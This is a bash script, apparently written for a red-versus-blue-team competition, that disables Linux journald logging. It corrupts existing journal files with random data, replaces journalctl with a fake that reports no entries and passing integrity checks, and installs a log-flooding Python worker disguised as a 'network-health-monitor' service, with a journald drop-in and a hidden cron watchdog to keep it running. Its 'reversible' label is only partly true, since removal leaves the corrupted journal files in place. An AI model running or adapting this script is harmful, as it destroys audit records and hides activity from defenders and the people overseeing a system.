#!/usr/bin/env bash
# =============================================================================
# flood-journal.sh — Make journald logging unusable
#
# Competition-compliant: REVERSIBLE. Originals backed up.
#
# What this does:
#   1. Backs up + poisons journald.conf (no rate-limit, no compress, 8G cap)
#   2. Corrupts existing .journal files with urandom garbage
#   3. Shadows journalctl with a fake that reports no entries / 0 disk usage
#   4. Installs 8-worker flood service (disguised as network-health-monitor)
#   5. Installs a systemd drop-in on systemd-journald so workers respawn
#      even if the service file is found and removed
#   6. Installs cron watchdog (every-minute + @reboot) for extra persistence
#
# Usage:
#   sudo ./flood-journal.sh install
#   sudo ./flood-journal.sh remove
#   sudo ./flood-journal.sh status
# =============================================================================

set -euo pipefail

JOURNALD_CONF="/etc/systemd/journald.conf"
JOURNALD_BACKUP="/var/cache/.syspkg/journald.conf.orig"
SERVICE_NAME="network-health-monitor"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
DROPIN_DIR="/etc/systemd/system/systemd-journald.service.d"
DROPIN_FILE="${DROPIN_DIR}/telemetry.conf"
FLOOD_BINARY="/usr/local/lib/.nhmw"
JOURNALCTL_LOC=$(which journalctl)
SHADOW_SPOOL="/var/cache/.syspkg/tabs/root"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo "Run as root"; exit 1; }; }

# --------------------------------------------------------------------------- #
# install
# --------------------------------------------------------------------------- #
cmd_install() {
    require_root
    mkdir -p /var/cache/.syspkg
    chmod 700 /var/cache/.syspkg

    # ── 1. Backup + poison journald.conf ─────────────────────────────────────
    hdr "1/6  Reconfiguring journald"

    [[ ! -f "$JOURNALD_BACKUP" ]] && cp "$JOURNALD_CONF" "$JOURNALD_BACKUP"

    cat > "$JOURNALD_CONF" <<'EOF'
[Journal]
Storage=persistent
SystemMaxUse=8G
SystemKeepFree=64M
SystemMaxFileSize=512M
SystemMaxFiles=64
MaxRetentionSec=12month
MaxFileSec=1month
RateLimitIntervalSec=1s
RateLimitBurst=1000000
Compress=no
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no
Audit=yes
EOF
    systemctl restart systemd-journald
    info "journald.conf poisoned and restarted"

    # ── 2. Corrupt existing .journal files ───────────────────────────────────
    hdr "2/6  Corrupting existing journal files"

    JOURNAL_DIR=$(journalctl --header 2>/dev/null | grep "File path" | awk '{print $NF}' | head -1 | xargs dirname 2>/dev/null || echo "/var/log/journal")
    CORRUPT_MANIFEST="/var/cache/.syspkg/corrupted-journals.txt"
    > "$CORRUPT_MANIFEST"

    find /var/log/journal -name "*.journal" 2>/dev/null | while read -r jf; do
        # back up just the filename list (not the files — they could be GBs)
        echo "$jf" >> "$CORRUPT_MANIFEST"
        # append 2MB of urandom garbage — corrupts the binary format trailer
        # journalctl can no longer parse the file; vacuum still has to read it
        dd if=/dev/urandom bs=1M count=2 >> "$jf" 2>/dev/null || true
    done

    COUNT=$(wc -l < "$CORRUPT_MANIFEST" 2>/dev/null || echo 0)
    info "Corrupted $COUNT existing journal files (list saved to $CORRUPT_MANIFEST)"

    # ── 3. Shadow journalctl ─────────────────────────────────────────────────
    hdr "3/6  Shadowing journalctl"

    if [[ ! -f "/var/cache/.syspkg/journalctl.orig" ]]; then
        cp "$JOURNALCTL_LOC" "/var/cache/.syspkg/journalctl.orig"
    fi

    cat > "$JOURNALCTL_LOC" <<'EOF'
#!/usr/bin/env bash
# journalctl - systemd journal reader

for arg in "$@"; do
    case "$arg" in
        --disk-usage)
            echo "Archived and active journals take up 0 B in the filesystem."
            exit 0 ;;
        --vacuum-size*|--vacuum-time*|--vacuum-files*)
            echo "Vacuuming done, freed 0B of archived journals on disk."
            exit 0 ;;
        --verify)
            echo "PASS: all journal files pass integrity check."
            exit 0 ;;
        --header)
            echo "File path: /var/log/journal/$(cat /etc/machine-id 2>/dev/null)/system.journal"
            exit 0 ;;
    esac
done

echo "-- No entries --"
exit 0
EOF
    chmod 755 "$JOURNALCTL_LOC"
    info "journalctl shadowed — will report no entries and 0 disk usage"

    # ── 4. Write the flood worker ─────────────────────────────────────────────
    hdr "4/6  Installing flood worker"

    cat > "$FLOOD_BINARY" <<'WORKER'
#!/usr/bin/env python3
"""
Network Health Monitor Worker — writes diagnostic telemetry to syslog.
"""
import socket, os, time, random, string, sys

FACILITY = 1
SEVERITY = 6
PRI = (FACILITY << 3) | SEVERITY
SOCK = "/dev/log"
HOSTNAME = socket.gethostname()
TAG = "NetworkHealthMonitor"

def noise(n=3800):
    return ''.join(random.choices(string.hexdigits, k=n))

def main():
    worker_id = os.getpid()
    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    try:
        s.connect(SOCK)
    except FileNotFoundError:
        import subprocess, itertools
        pad = noise()
        for i in itertools.count():
            subprocess.run(
                ["logger", "-t", TAG, "-p", "user.info",
                 f"[worker:{worker_id}][seq:{i}] diagnostics: {pad}"],
                capture_output=True
            )
        return

    seq = 0
    while True:
        pad = noise()
        msg = (
            f"<{PRI}>{time.strftime('%b %d %H:%M:%S')} {HOSTNAME} "
            f"{TAG}[{worker_id}]: [seq:{seq}][worker:{worker_id}] "
            f"network diagnostic telemetry: {pad}"
        ).encode()[:65000]
        try:
            s.send(msg)
        except (OSError, BrokenPipeError):
            time.sleep(0.1)
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
                s.connect(SOCK)
            except OSError:
                pass
        seq += 1

if __name__ == "__main__":
    main()
WORKER
    chmod 755 "$FLOOD_BINARY"
    info "Flood worker installed at $FLOOD_BINARY"

    # ── 5. Install systemd service + drop-in ─────────────────────────────────
    hdr "5/6  Installing systemd service + journald drop-in"

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Network Health Monitor
Documentation=https://systemd.io
After=network.target systemd-journald.service
Wants=network.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'for i in \$(seq 1 8); do python3 ${FLOOD_BINARY} & done; echo \$! > /run/${SERVICE_NAME}.pid'
PIDFile=/run/${SERVICE_NAME}.pid
Restart=always
RestartSec=5
LogRateLimitIntervalSec=0
LogRateLimitBurst=0
User=root
Nice=10

[Install]
WantedBy=multi-user.target
EOF

    # drop-in on systemd-journald: anytime journald restarts (e.g. blue team
    # does systemctl restart systemd-journald to recover config), workers
    # get relaunched automatically
    mkdir -p "$DROPIN_DIR"
    cat > "$DROPIN_FILE" <<EOF
[Service]
ExecStartPost=/bin/bash -c 'sleep 2 && systemctl start ${SERVICE_NAME} &'
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" --quiet
    systemctl start  "$SERVICE_NAME"
    info "Service installed and started (8 workers)"
    info "Drop-in installed at $DROPIN_FILE (relaunches on journald restart)"

    # ── 6. Cron watchdog ──────────────────────────────────────────────────────
    # shadow-crond's hidden spool already watches for this service every 5 min —
    # no visible cron entry needed here. Adding one to root crontab or /etc/cron.d
    # is detectable by blue team via crontab -l / ls /etc/cron.d.
    hdr "6/6  Watchdog"
    info "Watchdog delegated to shadow-crond hidden spool (${SERVICE_NAME} watched every 5 min)"
    info "Run shadow-crond.sh install first if not already deployed"

    echo
    info "=== Flood active ==="
    info "journalctl is shadowed — blue team sees no entries, no disk usage"
    info "Existing journal files corrupted — historical logs unreadable"
}

# --------------------------------------------------------------------------- #
# remove
# --------------------------------------------------------------------------- #
cmd_remove() {
    require_root

    hdr "Stopping flood service"
    systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Service not running"
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    rm -f "$SERVICE_FILE"
    rm -f "$DROPIN_FILE"
    rmdir "$DROPIN_DIR" 2>/dev/null || true
    systemctl daemon-reload
    pkill -f "$FLOOD_BINARY" 2>/dev/null || true
    info "Service and drop-in removed"

    hdr "Cron watchdog"
    info "Watchdog is in shadow-crond spool — remove shadow-crond separately if needed"

    hdr "Restoring journalctl"
    if [[ -f "/var/cache/.syspkg/journalctl.orig" ]]; then
        cp "/var/cache/.syspkg/journalctl.orig" "$JOURNALCTL_LOC"
        info "journalctl restored"
    else
        warn "No journalctl backup found"
    fi

    hdr "Restoring journald.conf"
    if [[ -f "$JOURNALD_BACKUP" ]]; then
        cp "$JOURNALD_BACKUP" "$JOURNALD_CONF"
        info "journald.conf restored"
    else
        warn "No backup found — writing safe defaults"
        cat > "$JOURNALD_CONF" <<'EOF'
[Journal]
Storage=auto
Compress=yes
SystemMaxUse=
RateLimitIntervalSec=30s
RateLimitBurst=10000
EOF
    fi
    systemctl restart systemd-journald
    info "journald restarted with original config"

    hdr "Removing flood worker"
    rm -f "$FLOOD_BINARY"
    info "Removed $FLOOD_BINARY"

    echo
    DISK=$(/var/cache/.syspkg/journalctl.orig --disk-usage 2>/dev/null || echo "(unknown)")
    warn "=== Journal is still full and files are corrupted ==="
    warn "Current usage: $DISK"
    warn "Blue team still needs:"
    warn "    sudo journalctl --vacuum-size=50M"
    warn "    sudo journalctl --vacuum-time=1h"
    warn "    (corrupted .journal files may need manual deletion from /var/log/journal/)"
    info "Flood stopped and config restored."
}

# --------------------------------------------------------------------------- #
# status
# --------------------------------------------------------------------------- #
cmd_status() {
    hdr "Service"
    systemctl status "$SERVICE_NAME" --no-pager -l 2>/dev/null \
        || warn "$SERVICE_NAME not found"

    hdr "Drop-in"
    [[ -f "$DROPIN_FILE" ]] && cat "$DROPIN_FILE" || warn "Drop-in not present"

    hdr "Worker processes"
    pgrep -a -f "$FLOOD_BINARY" 2>/dev/null || warn "No workers running"

    hdr "journalctl shadow"
    head -1 "$JOURNALCTL_LOC" 2>/dev/null || warn "journalctl not found"

    hdr "Journal disk usage (real)"
    /var/cache/.syspkg/journalctl.orig --disk-usage 2>/dev/null || \
        du -sh /var/log/journal 2>/dev/null || warn "Cannot determine"

    hdr "Watchdog (shadow-crond spool)"
    if systemctl is-active --quiet systemd-timesyncd-helper 2>/dev/null; then
        info "shadow-crond (systemd-timesyncd-helper): RUNNING"
        if [[ -f "$SHADOW_SPOOL" ]] && grep -q "$SERVICE_NAME" "$SHADOW_SPOOL" 2>/dev/null; then
            info "Watchdog entry confirmed in $SHADOW_SPOOL"
        else
            warn "Watchdog entry NOT found in shadow-crond spool at $SHADOW_SPOOL"
            warn "Run: sudo ./shadow-crond.sh install"
        fi
    else
        warn "shadow-crond NOT running — watchdog is inactive"
        warn "Run: sudo ./shadow-crond.sh install"
    fi
}

# --------------------------------------------------------------------------- #
CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *)
        echo "Usage: sudo $0 {install|remove|status}"
        echo
        echo "  install   Start the journal flood"
        echo "  remove    Stop flood + restore config"
        echo "  status    Show service state, worker count, and journal disk usage"
        ;;
esac
